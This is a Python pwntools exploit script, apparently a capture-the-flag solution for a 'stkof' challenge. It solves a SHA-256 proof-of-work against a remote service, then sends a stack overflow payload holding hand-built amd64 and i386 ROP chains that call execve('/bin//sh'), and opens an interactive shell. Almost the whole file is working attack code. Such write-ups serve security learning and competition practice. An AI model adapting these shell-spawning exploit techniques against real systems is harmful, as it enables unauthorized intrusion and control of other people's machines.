#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

r = None

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

from struct import pack
import hashlib
import itertools

def exploit(host):
    global r
    if args.R:
        r = remote('49.4.51.149', 25391)
       
        data = r.recvuntil('skr[0:5]')
        target = re.findall('[0-9a-f]{64}', data)[0]
        print target
        
        data = r.recvuntil('[-]skr.encode(\'hex\')=')
        prefix = re.findall('[0-9a-f]{10}', data)[0]
        print prefix
        
        for _ in itertools.product(xrange(0, 256), repeat=3):
            candidate = prefix.decode('hex') + ''.join(map(chr, _))
            if hashlib.sha256(candidate).hexdigest() == target:
                print ''.join(map(chr, _)).encode('hex')
                r.sendline(candidate.encode('hex'))
                r.sendline('3cea202be9fd82bc6dfcf9a5271558b6')
                break

    else:
        #r = process('./__stkof')
        #r = process('./_stkof')
        r = process('./__stkof')

    p  = "a"*272
    p += pack('<I', 0x0807c2b9)
    p += "xxxx"
    p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
    p += pack('<Q', 0x00000000006a10e0) # @ .data
    p += pack('<Q', 0x000000000043b97c) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
    p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
    p += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
    p += pack('<Q', 0x00000000006a10e0) # @ .data
    p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
    p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
    p += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
    p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
    p += pack('<Q', 0x000000000043b97c) # pop rax ; ret
    p += pack('<Q', 0x00000000003b) # pop rax ; ret
    p += pack('<Q', 0x0000000000461645) # syscall ; ret

    p += 'o'*8

    p += pack('<I', 0x0806e9cb) # pop edx ; ret
    p += pack('<I', 0x080d9060) # @ .data
    p += pack('<I', 0x080a8af6) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806e9cb) # pop edx ; ret
    p += pack('<I', 0x080d9064) # @ .data + 4
    p += pack('<I', 0x080a8af6) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806e9cb) # pop edx ; ret
    p += pack('<I', 0x080d9068) # @ .data + 8
    p += pack('<I', 0x08056040) # xor eax, eax ; ret
    p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080d9060) # @ .data
    p += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080d9068) # @ .data + 8
    p += pack('<I', 0x080d9060) # padding without overwrite ebx
    p += pack('<I', 0x0806e9cb) # pop edx ; ret
    p += pack('<I', 0x080d9068) # @ .data + 8
    p += pack('<I', 0x080a8af6) # pop eax ; ret
    p += pack('<I', 11) # pop eax ; ret
    p += pack('<I', 0x080495a3) # int 0x80
    #p  = p.ljust(0x300, 'o')
    print len(p)
    #attach(0x804892F )
    r.send(p)
    sleep(0.1)
    r.sendline('ls')

if __name__ == '__main__':
    host = '127.0.0.1'
    exploit(host)
    r.interactive()

